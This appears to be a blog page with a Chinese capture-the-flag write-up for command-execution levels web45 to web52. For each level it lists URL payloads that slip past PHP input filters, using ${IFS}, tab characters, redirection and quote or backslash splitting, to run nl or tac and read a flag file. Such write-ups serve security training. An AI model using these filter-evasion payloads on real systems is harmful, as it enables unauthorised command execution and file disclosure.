@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web45开启容器 过滤了空格 空格绕过方法 12345%09$&#123;IFS&#125;$&#123;IFS&#125;$9&lt;****   payload:&#x2F;?c&#x3D;tac$&#123;IFS&#125;fla?.php||ls 其他方法 123?c&#x3D;nl%09fl*%0a?c&#x3D;nl&lt;fla\g.php%0a?c&#x3D;echo$&#123;IFS&#125;&#96;nl$&#123;IFS&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web45-52">
+<meta property="og:url" content="https://youngking-gfy.github.io/2025/03/13/web45-52/index.html">
+<meta property="og:site_name" content="Youngking&#39;s Blog">
+<meta property="og:description" content="web45开启容器 过滤了空格 空格绕过方法 12345%09$&#123;IFS&#125;$&#123;IFS&#125;$9&lt;****   payload:&#x2F;?c&#x3D;tac$&#123;IFS&#125;fla?.php||ls 其他方法 123?c&#x3D;nl%09fl*%0a?c&#x3D;nl&lt;fla\g.php%0a?c&#x3D;echo$&#123;IFS&#125;&#96;nl$&#123;IFS&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313115623755.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313115804878.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313120206172.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313120712130.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313121351875.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313121805455.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313122212951.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313122302290.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313122606049.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313122830432.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313122934878.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313123210883.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313123353106.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313123631080.png">
+<meta property="article:published_time" content="2025-03-13T03:52:16.000Z">
+<meta property="article:modified_time" content="2025-03-13T04:36:42.966Z">
+<meta property="article:author" content="Y0ungK1ng">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://youngking-gfy.github.io/2025/03/13/web45-52/file-20250313115623755.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>web45-52</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/12/web37-44/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/13/web45-52/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&text=web45-52"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&is_video=false&description=web45-52"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web45-52&body=Check out this article: https://youngking-gfy.github.io/2025/03/13/web45-52/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&name=web45-52&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/13/web45-52/&t=web45-52"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web45"><span class="toc-number">1.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web46"><span class="toc-number">2.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web47"><span class="toc-number">3.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web48"><span class="toc-number">4.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web49"><span class="toc-number">5.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web50"><span class="toc-number">6.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web51"><span class="toc-number">7.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web52"><span class="toc-number">8.</span> <span class="toc-text">web52</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web45-52
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Y0ungK1ng</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-13T03:52:16.000Z" class="dt-published" itemprop="datePublished">2025-03-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AE%89%E5%85%A8/">渗透安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>开启容器</p>
+<p>过滤了空格<br><img src="/2025/03/13/web45-52/file-20250313115623755.png"></p>
+<p>空格绕过方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">09</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">&lt;</span><br><span class="line">****</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web45-52/file-20250313115804878.png"></p>
+<p>payload:<br><code>/?c=tac$&#123;IFS&#125;fla?.php||ls</code></p>
+<p>其他方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%<span class="number">09</span>fl*%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;fla\g.php%<span class="number">0</span>a</span><br><span class="line">?c=<span class="keyword">echo</span>$&#123;IFS&#125;`nl$&#123;IFS&#125;fl*`%<span class="number">0</span>a		<span class="comment">// 反引号表示无回显的命令执行，常配合echo来打印输出</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web45-52/file-20250313120206172.png"></p>
+<p>数字也被禁用</p>
+<p>空格绕过方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">09</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">&lt;</span><br><span class="line">****</span><br></pre></td></tr></table></figure>
+
+<p>还剩下&lt;</p>
+<p>用\绕过过滤，<br><code>nl%3Cfla\g.php%0a</code><br><img src="/2025/03/13/web45-52/file-20250313120712130.png"></p>
+<p>其他payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%<span class="number">09</span>????.???%<span class="number">0</span>a</span><br><span class="line">?c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">?c=nl%<span class="number">09</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>
+
+<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web45-52/file-20250313121351875.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web45-52/file-20250313121805455.png"></p>
+<p>其实跟上题payload一样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br><span class="line">?c=nl%<span class="number">09</span>????.???%<span class="number">0</span>a</span><br><span class="line">?c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">?c=nl%<span class="number">09</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;fla*%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;fla\g.php%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>
+
+<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web45-52/file-20250313122212951.png"></p>
+<p>过滤了更多</p>
+<p><img src="/2025/03/13/web45-52/file-20250313122302290.png"></p>
+<p><code>?c=nl&lt;fla\g.php%0a</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?c=nl%<span class="number">09</span>????.???%<span class="number">0</span>a</span><br><span class="line">?c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">?c=nl%<span class="number">09</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;fla\g.php%<span class="number">0</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web45-52/file-20250313122606049.png"></p>
+<p>好像就多了%</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fla\g.php%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web45-52/file-20250313122830432.png"></p>
+<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web45-52/file-20250313122934878.png"></p>
+<p>\x09与\x26的含义其实就是%09（tab键）和%26（&amp;）<br>同样可以使用上题的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fla\g.php%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>开启容器</p>
+<p><img src="/2025/03/13/web45-52/file-20250313123210883.png"></p>
+<p>多了个tac，但依然不影响</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fla\g.php%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web45-52/file-20250313123353106.png"></p>
+<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>开启容器</p>
+<p><code>&gt;</code>和<code>&lt;</code>过滤掉了,但是<code>$</code>可以用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br><span class="line">?c=nl<span class="variable">$IFS</span>/fla<span class="string">&#x27;&#x27;</span>g||</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/13/web45-52/file-20250313123631080.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web45"><span class="toc-number">1.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web46"><span class="toc-number">2.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web47"><span class="toc-number">3.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web48"><span class="toc-number">4.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web49"><span class="toc-number">5.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web50"><span class="toc-number">6.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web51"><span class="toc-number">7.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web52"><span class="toc-number">8.</span> <span class="toc-text">web52</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/13/web45-52/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&text=web45-52"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&is_video=false&description=web45-52"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web45-52&body=Check out this article: https://youngking-gfy.github.io/2025/03/13/web45-52/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&title=web45-52"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/13/web45-52/&name=web45-52&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/13/web45-52/&t=web45-52"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Y0ungK1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
